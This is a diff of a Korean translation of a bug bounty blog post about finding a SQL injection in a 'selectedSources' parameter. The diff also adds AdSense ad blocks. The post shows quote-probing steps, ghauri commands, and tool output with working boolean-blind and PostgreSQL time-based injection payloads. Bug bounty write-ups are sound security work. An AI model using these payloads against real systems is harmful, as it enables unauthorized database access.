@@ -3,17 +3,13 @@ title: "첫 번째 유로 보상을 받은 방법"
 description: ""
 coverImage: "/assets/img/2024-06-19-HowIGotMyFirstBounty_0.png"
 date: 2024-06-19 21:16
-ogImage: 
+ogImage:
   url: /assets/img/2024-06-19-HowIGotMyFirstBounty_0.png
 tag: Tech
 originalTitle: "How I Got My First €€€€ Bounty"
 link: "https://medium.com/@machiavellli/how-i-got-my-first-bounty-65ad8a1763de"
 isUpdated: true
 ---
-
-
-
-
 
 안녕하세요!
 
@@ -23,7 +19,18 @@ isUpdated: true
 
 - https://ex.admin.service.example.com/
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 https://ex.service.service.example.com/
 
@@ -33,7 +40,18 @@ https://ex.abc.service.example.com/
 
 그런 다음 Burp를 통해 트래픽을 프록시하여 일반 사용자처럼 정렬기능을 제외한 다른 기능을 테스트하면서 사이트를 찾아보았지만, 흥미로운 기능은 없었습니다. 어떤 JS 파일에서 이미 본 흥미로운 매개변수들이 있었다는 것을 알게 되었습니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 “SelectedSources, SelectedTemplateNames” 처음에는 아마도 데이터베이스에서 일부 데이터를 가져오는 것인줄 알았어요. 그래서 '“, ‘, \', 와 같은 특수 문자를 입력하여 ' 이상을 찾는 테스트를 해보기로 결정했어요. 하나의 따옴표를 입력하자 500 HTTP 상태 코드(내부 서버 오류)를 받았고, 또 다른 따옴표를 더 추가하니 200 HTTP 상태 코드(정상)를 받았어요.
 
@@ -47,7 +65,18 @@ https://ex.service.example.com/history?selectedSources=someSources'' > 200
 
 가끔은 역슬래시를 입력하여 확인하기도 해요. 그런데 여기서는 400 안 좋은 요청(Java 앱이었어요)을 받았어요.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ```js
 그 후에는 데이터베이스 버전을 추출하기 위해 sqlmap을 실행해 보았지만, 불행히도 sqlmap은 PostgreSQL이 DBMS임을 제외하고는 아무것도 추출하지 못했습니다. 그러나 포기하지 않고 대신 ghauri(https://github.com/r0oth3x49/ghauri.git)를 사용해 보았어요!
@@ -57,7 +86,18 @@ ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" -
 Boom! 🚀
 ```
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ```js
 [09:22:32] [INFO] 대상 URL에 대한 연결 테스트 중
@@ -66,11 +106,11 @@ Ghauri는 저장된 세션에서 다음 인젝션 지점을 재개했습니다:
     유형: 블라인드 기반 boolean
     제목: OR 블라인드 기반 - WHERE 또는 HAVING 절
     페이로드: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586
-    
+
     유형: 블라인드 기반 시간
     제목: PostgreSQL > 8.1 및 시간 기반 블라인드 (주석)
     페이로드: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586
-    
+
 [09:22:33] [INFO] PostgreSQL 테스트 중
 [09:22:34] [INFO] PostgreSQL 확인 중
 [09:22:34] [INFO] 백엔드 DBMS는 PostgreSQL입니다
@@ -92,8 +132,18 @@ Ghauri는 저장된 세션에서 다음 인젝션 지점을 재개했습니다:
 
 다음 날, 회사에서 바운티를 수여했습니다.
 
-<div class="content-ad"></div>
+<!-- cozy-coder - 수평 -->
 
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1107185301"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ![이미지](/assets/img/2024-06-19-HowIGotMyFirstBounty_1.png)
 
